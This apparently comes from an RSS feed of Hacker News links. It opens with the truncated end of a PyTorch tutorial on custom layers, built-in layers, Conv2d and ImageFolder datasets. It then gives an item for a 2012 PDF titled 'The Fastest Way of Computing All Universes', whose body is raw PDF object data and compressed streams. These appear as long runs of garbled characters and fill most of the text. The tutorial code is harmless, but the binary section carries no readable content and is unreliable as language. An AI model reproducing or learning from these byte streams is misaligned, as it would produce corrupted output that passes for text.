        self<span>.</span>weights <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>randn(in_size, out_size))
        self<span>.</span>bias <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>zeros(out_size))
    <span>def</span> <span>forward</span>(self, x):
        <span>return</span> x<span>.</span>mm(self<span>.</span>weights) <span>+</span> self<span>.</span>bias
</code></pre></div><p>You can see how we wrap our weights tensor in nn.Parameter. This is done to make the tensor to be considered as a model parameter. From PyTorch
<a href="https://pytorch.org/docs/stable/generated/torch.nn.parameter.Parameter.html#parameter" target="_blank" rel="nofollow noopener">docs</a>
:</p><blockquote><p>Parameters are
<a href="https://pytorch.org/docs/stable/tensors.html#torch.Tensor" target="_blank" rel="nofollow noopener">&lt;code&gt;*Tensor*&lt;/code&gt;</a>
subclasses, that have a very special property when used with <em>Module</em> - when they’re assigned as Module attributes they are automatically added to the list of its parameters, and will appear in <em><code>parameters()</code></em> iterator</p></blockquote><p>As you will later see, the <code>model.parameters()</code> iterator will be an input to the optimizer. But more on that later.</p><p>Right now, we can now use this custom layer in any PyTorch network, just like any other layer.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> myCustomLinearLayer(<span>784</span>,<span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        <span>return</span> x
x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCustomNeuralNet()
model(x)<span>.</span>size()
<span>------------------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><p>But then again, Pytorch would not be so widely used if it didn’t provide a lot of ready to made layers used very frequently in wide varieties of Neural Network architectures. Some examples are:
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Linear.html#torch.nn.Linear" target="_blank" rel="nofollow noopener">nn.Linear</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d" target="_blank" rel="nofollow noopener">nn.Conv2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MaxPool2d.html#torch.nn.MaxPool2d" target="_blank" rel="nofollow noopener">nn.MaxPool2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.ReLU.html#torch.nn.ReLU" target="_blank" rel="nofollow noopener">nn.ReLU</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.BatchNorm2d.html#torch.nn.BatchNorm2d" target="_blank" rel="nofollow noopener">nn.BatchNorm2d</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Dropout.html#torch.nn.Dropout" target="_blank" rel="nofollow noopener">nn.Dropout</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding" target="_blank" rel="nofollow noopener">nn.Embedding</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.GRU.html#torch.nn.GRU" target="_blank" rel="nofollow noopener">nn.GRU</a>
/
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LSTM.html#torch.nn.LSTM" target="_blank" rel="nofollow noopener">nn.LSTM</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.Softmax.html#torch.nn.Softmax" target="_blank" rel="nofollow noopener">nn.Softmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.LogSoftmax.html#torch.nn.LogSoftmax" target="_blank" rel="nofollow noopener">nn.LogSoftmax</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.MultiheadAttention.html#torch.nn.MultiheadAttention" target="_blank" rel="nofollow noopener">nn.MultiheadAttention</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerEncoder.html#torch.nn.TransformerEncoder" target="_blank" rel="nofollow noopener">nn.TransformerEncoder</a>
,
<a href="https://pytorch.org/docs/stable/generated/torch.nn.TransformerDecoder.html#torch.nn.TransformerDecoder" target="_blank" rel="nofollow noopener">nn.TransformerDecoder</a></p><p>I have linked all the layers to their source where you could read all about them, but to show how I usually try to understand a layer and read the docs, I would try to look at a very simple convolutional layer here.</p><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/3_hu6bac2fdb22e4c85a567731e38a09e400_109832_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/3.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p>So, a Conv2d Layer needs as input an Image of height H and width W, with <code>Cin</code> channels. Now, for the first layer in a convnet, the number of <code>in_channels</code> would be 3(RGB), and the number of <code>out_channels</code> can be defined by the user. The <code>kernel_size</code> mostly used is 3x3, and the <code>stride</code> normally used is 1.</p><p>To check a new layer which I don’t know much about, I usually try to see the input as well as output for the layer like below where I would first initialize the layer:</p><div><pre><code data-lang="py">conv_layer <span>=</span> nn<span>.</span>Conv2d(in_channels <span>=</span> <span>3</span>, out_channels <span>=</span> <span>64</span>, kernel_size <span>=</span> (<span>3</span>,<span>3</span>), stride <span>=</span> <span>1</span>, padding<span>=</span><span>1</span>)
</code></pre></div><p>And then pass some random input through it. Here 100 is the batch size.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>3</span>,<span>24</span>,<span>24</span>))
conv_layer(x)<span>.</span>size()
<span>--------------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>64</span>, <span>24</span>, <span>24</span>])
</code></pre></div><p>So, we get the output from the convolution operation as required, and I have sufficient information on how to use this layer in any Neural Network I design.</p><hr><h2 id="datasets-and-dataloaders">Datasets and DataLoaders</h2><p>How would we pass data to our Neural nets while training or while testing? We can definitely pass tensors as we have done above, but Pytorch also provides us with pre-built Datasets to make it easier for us to pass data to our neural nets. You can check out the complete list of datasets provided at
<a href="https://pytorch.org/docs/stable/torchvision/datasets.html" target="_blank" rel="nofollow noopener">torchvision.datasets</a>
and
<a href="https://pytorch.org/text/datasets.html" target="_blank" rel="nofollow noopener">torchtext.datasets</a>
. But, to give a concrete example for datasets, let’s say we had to pass images to an Image Neural net using a folder which has images in this structure:</p><pre><code>data
    train
        sailboat
        kayak
        .
        .
</code></pre><p>We can use torchvision.datasets.ImageFolder dataset to get an example image like below:</p><div><pre><code data-lang="py"><span>from</span> torchvision <span>import</span> transforms
<span>from</span> torchvision.datasets <span>import</span> ImageFolder
traindir <span>=</span> <span>"data/train/"</span>
t <span>=</span> transforms<span>.</span>Compose([
        transforms<span>.</span>Resize(size<span>=</span><span>256</span>),
    transforms<span>.</span>CenterCrop(size<span>=</span><span>224</span>),
        transforms<span>.</span>ToTensor()])
train_dataset <span>=</span> ImageFolder(root<span>=</span>traindir,transform<span>=</span>t)
<span>print</span>(…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</a></em></p>]]>
            </description>
            <link>https://mlwhiz.com/blog/2020/09/09/pytorch_guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065771</guid>
            <pubDate>Thu, 12 Nov 2020 02:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fastest Way of Computing All Universes (2012) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065400">thread link</a>) | @optimalsolver
<br/>
November 11, 2020 | http://people.idsia.ch/~juergen/fastestuniverse.pdf | <a href="https://web.archive.org/web/*/http://people.idsia.ch/~juergen/fastestuniverse.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>äÈhÓY2_Ê²é[leóŒ‚÷*LÊxäñÎãÉÇÃ€ÎdŽíâ¢Sü
çîl'8ú}GV³±¯z€„{@šÃRXÔBÊ€3´£\ˆÌŽ�e3ƒ9™úP%‘'»O]D?AlÈÿ’¹f§ˆˆY=³{’ÂJØEy†ó6Ëý`ï
lh&lt;ßt{àT_±ãE‘¦°
´"€ƒ„›Ú?ÚÂªz„ìÆFeÈ�èU#®#qR¢úLGÜùa¾Ø)
Ø‰FæÌ\$Änÿ©îE´šø÷ã£‰+4Ï‡Ð¬³¶A¨-ñÈ¹ëjà]�Ñ¦a!ïöùÁÏi8Q	0)�éeFxº„¼ì]‘ÌI+ôØ'_Ô)†Î!ùç"r’àÐÄ0ð0LèÝØ¼yà#RZbVý~&amp;6ÐA7Íäh6±Æ		¤Á.½ÞÊˆRÏ)º¥ÞŽT¶ÔN`=D�4C§EYª1»¹2¡CMð�¤bÜÁÁî85¡bìÅDl6e‘jì¼Ñ¼8¼èLBŒ7á~L˜²–¿ÊÝ‰Dé	K%†·&gt;¸K� ú
òŠ(DÈkXÉóÃ3„{…™ŽJ•Ý²!môSb4·!Æ˜´F‘èˆ×(|ˆ"Ë™N°&nbsp;üq68šÚõ…åm�,ïy@
°—Í
{‰ByG8Ñ'÷2ñv¼7Õ¨´Î¶*�}Îƒæ¡ùêY^aE0Ù5i°;$ÇDñ	x¼4çˆtCÇ=Ð0ß­›QÏ2Êš!~f£]ðÝ]˜8ë('&gt;=˜ßª`ûŒ*è[]–&amp;vWá„à]P,KèwäÙ¼‰44_È¹
&lt;¢W¼_ÕåÏÉÞ9¡ðESI=gF‘7õ]Õ»j¡onüÚì´/~žÓ&gt;Éé¹¦YqB/P2§ý0™Ñ¶5et­‹¦*y‘õqË®$ßp~Ò”Ã¢&gt;º@ËP¼™vÛ�$P&amp;YcWãBÙ‰žs§úÜ®é«–RY¹úAÝÁõ%ùåì‡–õô@3­ÙšÛ1oDÏì6 Eõ£…³
"‘aÛ–bnÖÖêžºHÙ‚Gqwnrm?uó®j�¸.BÎ‘h.ZžjÌö¾J ˜ÜN^ÊxÍ¤eÅëFj]%êö”x,Ó&amp;~Ý•ð¢n’Š‹DÍÄŒsáþªPæ|
�;�þ_
X;YJ{péZºi³;7¯½¥ú±š…SÎþEÿf‡¤M
Úµ‚tGt†´Cjõ«¼Þt™kÕ­Å¨œ®¼ÎTj}œêÞ{q6güJw±ðÂ9â"¯Ñ¼„cþÍ÷¾–\DóÜÚKÁû‰æ»6HÿÕqcokC{•_[R–�»¤¸ „«B7E°Žªù^íþ¡Od�Ÿ¹4îo\S�èªí*úÉ™öŠÅ+ &amp;æX(ã¢&amp;WF¿¦ÊtCUÄ‚,•4‘}'Õ8öÎ]åºGÁßÛW
’·Õ0¢Zx)3‹p£“2tÏú¬€Õ,Áö“öŠZ:)iøÍ”o–h¤åŒç˜î;­‚|ÇßYxXkÈˆÐôUßÈGo›€ä�ª÷hùÍ¢:Ûª«8™T•,ÍefR)…rä„¢”xI1E×˜‹—x8�VDFºªFòšo×:ë}Êt6Šî%óe¯†õãv‰ÐU,Y¦0��Âh·ŸñÿÜãcŽpx-ì¶èç%“ñ®ùÜ­ÆéÈ0OÄôD½8æm¡ÞN˜PÂXHBŽØ“«Ú‰a.û9fˆ�­‚N!!U:»7å‘-p†¸þ=Ñç&gt;¢r0JŠ·Ì’	2³!ÎAÃ‚úS@Ñ@€ªƒú½m&amp;f7/ŠE–`b7&lt;²û	]ô13	u‰E™Öð9/šË0ô*7ä«a¥^Ç8DÆìÖ
éÆpð)Œ¥ÆÍþ@
âýee­nû÷é"›±œïnövç}�
Äp¯¦�µbØaî´K1ií%rýõâ¿3dsÑ$?¡&nbsp;xïxœüXne~Û¾å�¥VôÌ
IÊy‰Òjôi'=è‚Ûš�Ø‹€a¾Z roÈñ©àjñÔÏM€ô18cËþ¸ÆÐñMãÕg�—!˜qµð.Ê½¦HÎÁ
�ÅáJŽ'ô=¹ iÛêÔë0p�+%…–7–w­ã¥p¨w·¼¢�åŽ”CSKtë¢-Rcyân"ª·Hõ0/Õ)Á7ÆvÙJUIz˜lYçŒ	hzÙèp&nbsp;^�&gt;©Ê‹!7ÙÕ¥é„îŸq†3�
$QKŽ4/ô&nbsp;LA�ís&gt;«[àKõz•Ü»ë.ÑácÏfÜÌT-¡¯£ª}R!�í^³ªÚäîð²]Zà-
ŒTïRñqøž@eZÏy±"‹i¦¤™Mª¬ª0¯j“‹
3œ*ò–4ÇÌ˜Vy½p—¾ÆÜ‚ÕògY|bˆ®“&gt;°iÉ[-Ç#áÇR-"BÙ2¡^¨Ÿ•Š�\Æj4Ãeì&amp;s1ñ)eS&lt;+‹’3$n¡öw1Rw}^¤xÐ¶&nbsp;œ4�}Ç=W�s¨›9ˆçj­ÙÏ"ùŽs¥lÄ:üø†1õld=Ä[�º˜�Òbg¥¶çL«ÉØÓÑ?Qè¡æÖª9ÖgŸGÒ¤Å˜óçç€Ð¡�¡3©OScÏBÞTT}ŠÇ8!Ì¯,NW#P�CÎ¹ú®/Ö€,(=ì6jørÍwúôÄ�|eÞ¬h°d^)›YY
´–^¿È=	j™ñáb
®Ù-�yçyu(�¨¬r;©êe·Ëj,ÆJ3´øÚdÚ÷�²Œ¥GŒm«ªý5‡q¹dµ9©-¦Í¹k�•¶§ñ„ž+ò–l6ý&lt;9MPwñRö¢yÆËTöp
K‹[ukbŠ¶�ê*4?Yqÿ$¢«’±1&gt;w"Ú‡SÝÃ±_np#ë½2î›"Õ®æj�ž½Žd¶”S¶ª¸ow!�êOPrRÐÑ$âÍ÷Ö<l}k&r>ù�dÑ24ïÎå’+Í;X-Š¥x—Ü�ñ¥jÓ¿îÏž”uC8)Öx�&nbsp;º•m3¾�WÉsRM8…û‰T‹2d¼¢¤àz‹‹ú¢ÚqÆ(g&nbsp;î“�úVË`¥É’ »6¯!=µ7Ò*„¤w"~¹„’e›8ybJ‚*6­÷ ½‡¹ùi“ƒüœ¹âLKÂ“]æ’EÅ¬À&nbsp;®([ÐïòöÈz_T™u¬�£2ø÷½þ|Ñ$ß‹¿_~\þ·Þ’[
endstream
endobj
4 0 obj
   3245
endobj
2 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-1-0 6 0 R
      /f-2-0 7 0 R
      /f-3-0 8 0 R
      /f-4-0 9 0 R
      /f-5-0 10 0 R
      /f-6-0 11 0 R
      /f-7-0 12 0 R
      /f-8-0 13 0 R
   &gt;&gt;
&gt;&gt;
endobj
14 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 3 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 2 0 R
&gt;&gt;
endobj
16 0 obj
&lt;&lt; /Length 17 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉŠ4Ç¾×SôL+÷†&gt;„Aàƒì~|è®žË ùà×w|±dfÍt[2BóWeeFFÆòÅ’ýëæNµ‡SñþôR»?ýö~úûé_4Šÿ~ûéôÝÕ�~ú÷ö§·­œ{��Çõ±»s-½÷z*C¥·xzûeûîãÅ½¸“?½}lß^�wáú«‹——˜Ó«K—ÿêò…þr•ñÝ•€·1±oîÊo×Ë?Þ~Ø|?·Ö#±òvÇ·Kh¯n¿D÷êîîÝ}]ï¼Ç*ˆ†�&gt;ù&lt;_?z�Y7úŽíé#Æ#;&gt;æWeÂ;3ðîo~÷z×ß}ðIŸuóà6¿¡Ÿk,Ùø
	`C¨ú�C$ÒÙ…�h“„Õ4Ybî"3qÇô¢ŒbƒïßTeýóÉ�Cï§ÿÐÀôÿÏÛ·Ð�;Ý7ïN9ýJzÁDü%…ŸIPÛþËÖÂ¹§~zñ¾œcÍ§_N6ÒÃ9÷ÿ&lt;ýíôãöœ@gçñ{#5Ÿ{XF~—)6IäÏéÿ£AÜ¶¶žcýÁƒØ¹›sçTã"‰J†žKøÃ¢ Ÿ8‡¸ŠÂFþð1&amp;cès?ñaeâ¬!~æcø;9z%WvBR}Ìç˜[ï…€¢žc½eõôfžÎŽNNþö3†»
Óüƒ££›³^b#·�äøÙW]£;97ÀàF&gt;›îç^x™;éãÂGníÜ›ë­(aAœ›#<swï. ¡’·Àubˆ¯ÄvxspïpƒèÍÝh6¹¢¼ß7ššÜn~"6��Ê;wÃ•ÈÑ÷»&¼r÷%t¥ÍÞë’‚œº¬Û7×vx="">‘aØÀŠâÞ‰ÝÚ‘a)æðl™çF´4n´yü´G&nbsp;ó¦ä/z@·‡N,AšŽÀ@‚=€YBDZCÀG¸ÆgyaZþ5&amp;…%ú	¯‰M²KÝmc¹à5“hy=íá»J�9Þ]Wñ`6tìô�•2ŽàÝ¦ëÉ vÖXæôSÐ(«bd™î5šPÐ(ÂnC×¹Ÿh-MÁDçœ†”IßIšbÊÞ,‹fBuEM¹ùÛå¥8õ‡�kX¾Ò+�8/˜)6Æ&nbsp;
¤ãð‘Œ�
áÚ‰mÚ¸&gt;Ö‚ÉÕÀ™�èK.I5ù�çê Ú‹BV„[up„ahO'¤sÈàsè&nbsp;L¹°mÑÛéXzåX)ë%jN:Wõ…4fß§&amp;yFŸ&amp;J4%¤yÙËñ'0^ÔX×ƒëºÈÉ&lt;ËP½_£(;§¢o¤XŸßŸØ;‰ôØ�ÉÖ™"†˜j…‰VFÞ0"x¡Ï"ÚB¢�NÍ&lt;ú
Ž×*}*—Y XSL•¶eaOOÅ1|\m?ÕÆG!&amp;
±ZÞÞØ¸N#+&amp;â!ü9	GšdÅ¡ƒp}$0.0õ¯	žÏñLÞRÜ¡è›zëŠ·eâ~¢CÐúx]
ÅÚ.Óút®µÏõ¼žÐ›jb¨ƒPè¿›Œ�);&lt;{+”l’Åç³ãÓn"·4T˜aúÞ'5À7Lñjw&nbsp;a¢ÎF­ˆ$IÊ
k¬åÒ^c€fÆ`3²Š¤ªØp=¿Cô/$K:~?ÂÍ7sÎèíÜû#ciÃ£šôÌK6v¼Ka7‰~æÑ!Å†¯È&lt;‰ÂD'ÁÅ'”žž…T²3$š)î2]OÀ˜á6ÅŒ+Þóâ+¢Bùê¥Ù%øêÍ¢ZïŒˆWŽÈ…(86Zò¡¢ÈåõåªR¢çÐ)ãeö»°ÒqXñP‘#½I¤É&gt;4V/GÐi7²ü.ˆ)òÞ¬òïMAQva&nbsp;8µGÁæ›Z¶ ±—°¥ç¹ž@ÿ)ùƒ]¾+x.éÅKâÀº±µ#úxÑ3¨“²š;¢&nbsp;˜;ÇCÑÏÅû
í¬C'úªÙJ´×UMI«à7&amp;Ó#�JÜóŽÁ!ñö%BŽ„"å½
&gt;ô	ƒ¾�ÿìÂŒ6¸ÂjãçKN²T¢«~N¸Í	Œ¢·Y&nbsp;.Ê¤p›*‘	tÞmÝ4¹Ýùoà¿2RŸ¤¹ÑQÚ¨²ötâ)ô¨Éþ°K~
ëñx
!O¹‹§óÈ�”�-òÕMŒÊ¨ˆeGo©²RxO9ùj¼ŒWd{‡ä+:ÿØRDjêd�‘{U(fc,Šü¢+ëL+Š,?B£”ý%ËŸaÃk‚Ú<k“iÐ"{¬€¹Éfº…É‡È5ò pb€mfëbØnŠñrÇ¼="" îŽÄ£p´q²Ú•)2£ø@b£•‚çê6�¤Ì@¡i<�ç"ûqz%Ù="">Ì4ë(z9ÃFsÓÌÖ()uƒ˜ò¿†˜gYFF!Â›&gt;É3ÈÅC†‹Ç^Ï5&amp;Øþ—&lt;ãª~ãŸdT—’‘mP¦rö”·*«ßH%£`o¶±XªloôMå*2U=r~yãñ‡\×jC˜ã
“óH%EfçõìNá\Õõ³7/-¤¨åáUÚcàE#¦¼‰Aqù„×+²ÍâxÄ]7«oÄøÝˆÑ¼@ÎÏOX†çð:™¦ó))«XZæ~
ûiøaKúrñZ�,F¶Ûœp	‹eûªxsÎ$ÿÅÁ$×JMK8tx;bÏ±2$êµu•­¬Ý,�À@å•õX£ÉcQÑUd»m¾¹«%
û0øÐxë$
ZNû3ÈYŠD\áŽ#cy’;�@Õ÷¤Å;?gÓšW­J2ÄOT¾�!‚óy†ñdÀ`´þª”ì×ÆèY‘ý¢}Š©ã»n­¢cSjME™7~ÜQaßwÙÊz*báAº+±²¥è¬ÐÇã
¨ÆÞÛÆWnHð :»æÉÜHp�qX2C	èŒ¬�Ù…²�‰«9ýj&amp;·‘®!w¶EÛîºª&nbsp;µœG\Ù‹M�þQ.�¯Þú1CßÆ‹Á—™‹Œ¨*˜¾?1š$É¸@6Ãà!ºÜÜÀB‰lê2ïÀke#�â7¥,-ó¡*ixX³ì�ÓÛ¤‰:7&gt;(=V}D†åÑ3uÓ�¥((%8ç€ñ)×wån6@ßÌ
ßgKè®ŒI¾©�•ç
‚
mð„À—
D.Ä©•��|µ‚JuÀs¤Óg2dã ‰èÇÆÂ�¾óîCVV EŒF˜©ÑùtÕ·àƒ”!�ŒÃÚ¿[¯ŒÂ¾¿Ž(ñ©
ÇßâÚ¾BÆlø�˜·}Š™Ü¬[½ziÞÍZÔÜ
­O3o®adIg‡ec–®_Ê[?2æt‰D¾YÿJÚ”j‚’®sSXKBeêE[ŠÏ²—oÂá.­Ú”›5xrÿ’”ƒ2îË‚ªÆf˜Ø­D21pXâ™Œžw[u&amp;—.É‰€Ü
"úØæ.\ÒáÉ�Ö÷ÒYÉÍàilb&nbsp;;r¢÷8»UF•
ÖË‚~Y�p"“„k×ªçN;Ù¤-#™%“à"Ž N&lt;|XÑC2&nbsp;”~@8‡Å¨;/¹ÃŠzñÆi…ÄçÆhÞ‚ÞM¾"ƒ2zë‘#±ewÜ‰é`=&nbsp;Ô÷9çØÙŒ3QªÏüì°ó@ZŽÂÀrv)$½L½KØûŸ¹ùñÍª
MÒT<h[Þg*à-ÜÑ9Òyq3Ô?n2®&ž�mŠ®¸‡93×Ñ«Ìvvu#;.¸ƒŠÐj…:ú!‰b¹&�yÛ\Çj·�ØÏ¸jß²”Ã3y–w-‡„ã¹Àfg¹Ù¥qbëã>ã¬dÒ±M›ÃòYQ¯&nbsp;õÌÕòÀ/'+ÅrúJlò`Pº­MöVæ#qÆ7R‰9¼k×9¦ä5Ñ”GAízó³¥©Ç­z~û½|Œ2î‘I)Þ¬×[MR—ŠãÄ�$ž[_.JÙÍ6"Úa›ùh=¤,Yš^ÁŒh¥¾ÔùÒMÈV�UX@£ªƒýSôRCÜ¾%r(ìnólk‰V5ÍÍ?h$³·‰•ø‘}[¦L¼hþˆù·%v!(ä¼ä¶:d²’D2´c”=(ÇûZ¾ÇÏ%&nbsp;IåÕâÁã'!_ª÷ðì–€&lt;óÜ_-øVHry®_o	Þõ^�üY!Øí@—7«$¤àNgŸBëéKP»y+{wDoü�ÃUî
}×*HK9«äóµs­¦9üñ“‚S(ÙB,.��Eãb}ÃuÓíÓ®LaIõ�m+‘™§Þò¦— [3ðM½ç\~´è‡~N'ñ)–×ðÁi?8
øk­ÅJR/fÜV°.*&gt;ÏÑo’åKôUï¸Hëz‡ß‚cõŒÐü1ÓÐ&amp;æ®Sµ�†äO��%Ñe›9ë•&nbsp;7,Ä‹¹ÂˆN’ÚKæ&amp;œAj�cHEMìfG…�Pâ¶ÿçIÑ--ÿçÝ•€ŸÍËcí]ó©ùwO#›Š’TûÛ8µ\»pÚäº'MÍl’;È2µÕ8¢½xë%®×/Æ]Pˆg&gt;ºÅ*E¦a¥†È]�-r\½Ã‘—Ÿ¬k\ÃÝÅ`ä.×Ùõ»Ü-oúÃŠxH@@»�Ì‡½ÛåX‹uy)L¢Ý°Ï�‹¼#u�û8yüä„(2¢bõ’‰cÐ~\°S&lt;åû¡}²‡òµO›‡,íž’3ÌqëÁ§{’ßÇEbéƒÑ¥£¬e¯&nbsp;‘%—ÓGþò�ðU•_Ù‰D©wöY4ý’fÙÛ7ñkÇ­gIRÇ,&nbsp;*~7:‡œÜ»šîçÊÈuŒ©ñ&amp;Œ=ëÈ/Œ§±z)Å«·íHsž¯¹vWd8âfY"¼#‹ó‡®«auF±™ëñ
üó˜&amp;kˆ”³½7ý_à«$¯+e¦±èNN(èE�&gt;e¾kòš �Y”†TòYB[µ³çFr§ò�.&lt;ÐptªaþY„i—Gí:UqW-ó—%K©&amp;¿V5âç�_ûPÐûícQî~šÝ'«ßpú=Ð&amp;�BP¹7Âi¶rO8”3u+t´xqó&gt;F{Åý×Ëêïß¶·ÿÖ±8œ
endstream
endobj
17 0 obj
   3732
endobj
15 0 obj
&lt;&lt;
   /ExtGState &lt;&lt;
      /a0 &lt;&lt; /CA 1 /ca 1 &gt;&gt;
   &gt;&gt;
   /Font &lt;&lt;
      /f-0-0 5 0 R
      /f-8-0 13 0 R
      /f-9-0 18 0 R
      /f-2-0 7 0 R
      /f-1-0 6 0 R
      /f-6-0 11 0 R
      /f-10-0 19 0 R
      /f-7-0 12 0 R
   &gt;&gt;
&gt;&gt;
endobj
20 0 obj
&lt;&lt; /Type /Page
   /Parent 1 0 R
   /MediaBox [ 0 0 611.999983 791.999983 ]
   /Contents 16 0 R
   /Group &lt;&lt;
      /Type /Group
      /S /Transparency
      /CS /DeviceRGB
   &gt;&gt;
   /Resources 15 0 R
&gt;&gt;
endobj
22 0 obj
&lt;&lt; /Length 23 0 R
   /Filter /FlateDecode
&gt;&gt;
stream
xœ•ZÉ®+Ç
Ý÷WèÔ®y-dáäY^H-É€°³Èï‡‡d
­áù†ïkU×Àb‘‡‡¬þ}1‡\Ý!Y{8æjÜÿ&lt;ü›Zñß¿¾»˜Ã/ÿY¾ÿ²¤µf_¸]«YsªµæCÊhJµøÃ—ß–ïGs4{øòX~:kÜÙÕ“ñç£�ádÂùhO&amp;žéOjM&amp;scA#Þ›äð«w¬‹¹ð¯Ëùç/?,¶®¥TO¢|¹a‰ëÙ•“ÙÎÞœÌÍÜÍCæµÆZŒ²Žæ°ÞÇÏÄ�V{æ…Þcyz‰v�ÇŠ—ñd/&lt;ñÆÜíÕnV÷boúïÝ:ôYwfáFÈëêš}ŠM^g¡1dV»Ñ£ó4u4ÎZÄ;5‘X:ÏBÜÐ=©&nbsp;Xà/_ôÈþþ×ƒY]­‡ÿRÃôÿ¯ËO?S“9Ük;üNç‚ŽøK¾ÒùáØ¶ß–âÖêáhmZ}Ž‡ß­¥º5�ôÿ:üãðãòy‚èVcMàüêk¡	r\«›Zþt:Ø¸Ÿ"¿†ÿo’¶”y½é7Òö]ŒYCö“&amp;2zLî›UA&gt;±:?«¢µ|ó6†½é›¥€ŸX7‹ufçŸåèþNŽžÉ•�L©�ÎDšÇÖ(òê�«%ª§×ÉÓo&amp;’+}!—¾Ÿ¹ð.ˆ6«Îè‹'{†ƒŠ1óoFø&amp;F’cZm2i±™Ý_üØd[Ø)1èrvédiêèù_ÈS7[¨ÓÍ\Íf�¹ZÃÞAb–!æùXJ0‚K7èR×šèx°i}´&gt;®&gt;–ZÓ!–²ÖbjIºi7múB»÷$y€h¤Ú¬ š«gönj¬'ÕC2y8~4@êÆoRV"ï–î7ÚD0üÊ…K@V_$tì&amp;(ý¥y	�ð&amp;bëËx´óì‘VÊô°þf£g€1f˜0«€v1éÜ&amp;J€&gt;˜qF•Ð{3w†T€ÝÐ{(Õ�ŒHŸ|´Ý@gr„¾Œ½`†àéø/uÑ_V±&gt;±šw
;„ÅxÚ¢mLRixÙpù$ÚÄpš/a:&amp;‰IqèX½öLX°Þ‰%ËÉÉ$�Ã‘ä9�~½È]êô“¸iÁó&amp;ž—s—¡)R¾išâ£dùoÒq”L6¹JßšYçÙ¬¹ÓFÖŸÉlRëâ^»À6ƒ“M¡…|
f#v¼é;+š„¹rRCL™Æ­°˜
O‚c“-›éaXiî¾¾Á`sÛ%ìî½õm:AxÕœºåãuŒ7¤XUÌ‹Ý‘âš9»õUEÅ7õ¢£Ïôë:Ôàsç ?mû—w±1¼ÌJ´ÚÁÀœyÆ­û}4ì«Y&lt;Ž1â¾2+ïÊJo+²	°ƒ­%+ö¤vž@°ËùË¯o°Ë"&amp;
ˆÑ¬Ö¥1|2Ó=VÆJ
¼01ió™}Å³V«@›	Þ0Ëic²ZïÑŠG6¾¸{ÀAüIfMCRh�žæUÁ¨*qzU�óˆá´5O±Œh5oUs%e×÷Êq!SäË&lt;ƒÏ«Íñ­v`øl]$,l»	îï,YXCpÄïG"W�ô
6}¢&nbsp;B«šÃ®õ'ØCUÌ˜«Y…cŸa¦k™ÅRTªMº¸g

Ü5‹‚\¢.ïµDŠ'ª*±…¯i)
í¦Ð´o5EˆµÚêy–¯iªÒŽèÌxÍ"hŠS	/À¶ÁÔh�9%Œ)trz`)dsÁàákŒÈ°&amp;í
)Z�yhV'×–Êàs™fævŽº
.Uuê[&lt;È'6Ê]8“Q×Ž´Ÿª“2y�
èÞW[dƒ»�öŸÚ©72
–ADq]ÐKã®÷��£¼e ãq
ZòÖR!íjaÚŽ£$¶µC÷;[×ð|ÈV²ž‚aÖP•}a¿É´5‰ÍðqºDÔ�2—w�Ê[,dïB2DJ²Dñ‚‡Ä–·QÑêö€²–´0x°’"„I�µ�™÷h°Ú4‰’|‘»;ÉÉ-ä°qÈlùÁÓŽlX£+Ùg$Y¦ÔÂrQæÿ! °)g	ã-I(·´´x•%ÓI#4?;Š
